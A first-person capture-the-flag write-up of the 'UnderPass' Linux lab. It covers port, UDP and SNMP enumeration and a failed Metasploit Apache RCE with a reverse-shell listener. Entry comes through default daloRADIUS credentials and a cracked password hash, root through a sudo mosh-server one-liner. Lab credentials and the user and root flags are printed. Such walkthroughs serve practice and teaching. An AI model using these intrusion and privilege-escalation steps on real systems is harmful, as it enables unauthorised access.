#easy #linux 

## 0. **Lab infos**

**Difficulty :** Easy
**Name :** UnderPass
**IP** : 10.129.187.231
**Objectives :** Get user and root flags
**OS :** Linux

##### **Conclusion**
**Time :** 1h45
	**Start :** 04.02.2025 | 19:50
	**Break at/to :** 
	**Finish :** 04.02.2025 | 21:35
**Satisfaction :**  5/10 Because I use Medium but it's things I will never find
### 1. **Reconnaissance

First, we start with an #nmap scan

```BASH
nmap -p- -sV 10.129.187.231
```

Output :

```BASH
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It's a web app, go see it.

![[Pasted image 20250204195239.png]]

Interesting.

Try to connect with #ssh 

```BASH
ssh anonymous@10.129.187.231
```

Output :

```BASH
anonymous@10.129.187.231's password: 
Permission denied, please try again.
anonymous@10.129.187.231's password: 
Permission denied, please try again.
anonymous@10.129.187.231's password: 
anonymous@10.129.187.231: Permission denied (publickey,password).
```

There's no anonymous access.

Go use #gobuster to see if we find some pages :

```BASH
gobuster dir -u http://10.129.187.231/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It's look like there is no pages.

With #burpsuite we make the sitemap :
![[Pasted image 20250204203636.png]]

But only the index.html is accessible direct with `/index.html`

We make another #nmap scan :

```BASH
nmap -sU 10.129.187.231
```

Output :

```BASH
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct
```

In #Metasploit we scann the #snmp :

```BASH
[msf](Jobs:0 Agents:0) auxiliary(scanner/snmp/snmp_enum) >> set rhost 10.129.187.231
rhost => 10.129.187.231
[msf](Jobs:0 Agents:0) auxiliary(scanner/snmp/snmp_enum) >> run

[+] 10.129.187.231, Connected.

[*] System information:

Host IP                       : 10.129.187.231
Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
Contact                       : steve@underpass.htb
Location                      : Nevada, U.S.A. but not Vegas
Uptime snmp                   : 02:20:14.09
Uptime system                 : 02:20:02.70
System date                   : 2025-2-4 20:07:21.0


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We find `underpass.htb/daloradius` but the access is Forbidden.
We make a fuzz with #dirsearch

```BASH
dirsearch -u "http://underpass.htb/daloradius/" -t 50
```

Output :

```BASH
[14:12:30] 200 -  221B  - /daloradius/.gitignore
[14:12:40] 301 -  323B  - /daloradius/app  ->  http://underpass.htb/daloradius/app/
[14:12:43] 200 -   24KB - /daloradius/ChangeLog
[14:12:50] 200 -    2KB - /daloradius/docker-compose.yml
[14:12:50] 301 -  323B  - /daloradius/doc  ->  http://underpass.htb/daloradius/doc/
[14:12:50] 200 -    2KB - /daloradius/Dockerfile
[14:12:56] 301 -  327B  - /daloradius/library  ->  http://underpass.htb/daloradius/library/
[14:12:56] 200 -   18KB - /daloradius/LICENSE
[14:13:04] 200 -   10KB - /daloradius/README.md
[14:13:06] 301 -  325B  - /daloradius/setup  ->  http://underpass.htb/daloradius/setup/
```

The `/app` looks interesting.
More fuzz :

```BASH
dirsearch -u "http://underpass.htb/daloradius/app/" -t 50
```

Output :

```BASH
[14:15:42] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[14:16:05] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[14:16:05] 302 -    0B  - /daloradius/app/users/  ->  home-main.php
[14:16:07] 200 -    2KB - /daloradius/app/users/login.php
```

We find a login page.

![[Pasted image 20250204211651.png]]

Go find more pages but with another wordlist.

```BASH
dirsearch -u "http://underpass.htb/daloradius/app" -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Output :

```BASH
[14:20:24] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[14:20:24] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[14:20:43] 301 -  333B  - /daloradius/app/operators  ->  http://underpass.htb/daloradius/app/operators/
```

Let's try all the links.

`/operators` redirect us in a beta login page.

![[Pasted image 20250204212302.png]]


In #Metasploit we find a CVE for `Apache 2.4.50` but not 52. But let's try it.

## 2. **Weaponization


#netcat 
```BASH
nc -lvp 4444
```

```BASH
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_normalize_path_rce) >> set RHOSTS 10.129.187.231
RHOSTS => 10.129.187.231
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_normalize_path_rce) >> set LHOST 10.10.14.130
LHOST => 10.10.14.130
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_normalize_path_rce) >> set LPORT 4444
LPORT => 4444
```

Go exploit
## 3. **Delivery

## 4. **Exploitation

```BASH
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_normalize_path_rce) >> exploit

[-] Handler failed to bind to 10.10.14.130:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
```

I'm fucking dumb.

Stop the #netcat command.

```BASH
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_normalize_path_rce) >> exploit

[*] Started reverse TCP handler on 10.10.14.130:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[-] https://10.129.187.231:443 - No response, target seems down.
[*] Scanned 1 of 1 hosts (100% complete)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable.
[*] Exploit completed, but no session was created.
```

Go precise the `RPORT`

```BASH
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_normalize_path_rce) >> set RPORT 80
RPORT => 80
```

```BASH
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_normalize_path_rce) >> exploit

[*] Started reverse TCP handler on 10.10.14.130:4444 
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[*] Error: 10.129.187.231: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=10.129.187.231:80 state=error: wrong version number
[*] Scanned 1 of 1 hosts (100% complete)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable.
[*] Exploit completed, but no session was created.
```

It's try to connect on SSL but the target is on http so go define SSL to false

```BASH
[msf](Jobs:0 Agents:0) exploit(multi/http/apache_normalize_path_rce) >> set SSL false
[!] Changing the SSL option's value may require changing RPORT!
SSL => false
```

On the `/operators` beta login page we try to log with #defaultCredentials (`administrator:radius`).

And it's work.

![[Pasted image 20250204212518.png]]

On the user list, we can find a username and a hash of a password :

`svcMosh:412DD4759978ACFCC81DEAB01B382403`

Go on crackstation.

It's work we have now the password and login :

`svcMosh:underwaterfriends`

we can connect to ssh.
## 5. **Installation

## 6. **Command and Control

```BASH
svcMosh@underpass:~$ groups
svcMosh
svcMosh@underpass:~$ sudo whoami
[sudo] password for svcMosh: 
Sorry, user svcMosh is not allowed to execute '/usr/bin/whoami' as root on localhost.
```

We are not root.

Go take the user flag.

`ec565ec685ff025207eb49b706fad121

For escalate privileges I found this :

```BASH
mosh --server="sudo /usr/bin/mosh-server" localhost
```

**What it Does:  
mosh:** This is the Mosh (Mobile Shell) client, which is a tool for remote terminal access, offering features like better responsiveness, reliability over unreliable networks, and automatic reconnection.

**— server=”sudo /usr/bin/mosh-server”**: This specifies a custom command to run the Mosh server on the remote machine. Here:

**sudo** is used to execute the mosh-server with elevated privileges.  
**/usr/bin/mosh-server** is the full path to the mosh-server binary.  
localhost: Specifies the target host for the Mosh connection, which in this case is localhost (i.e., the local machine).


It's work and we are root
## 7. **Actions on Objectives

Go take the root flag.

`c8187f2c1a557c0a1d7f4e5318427481`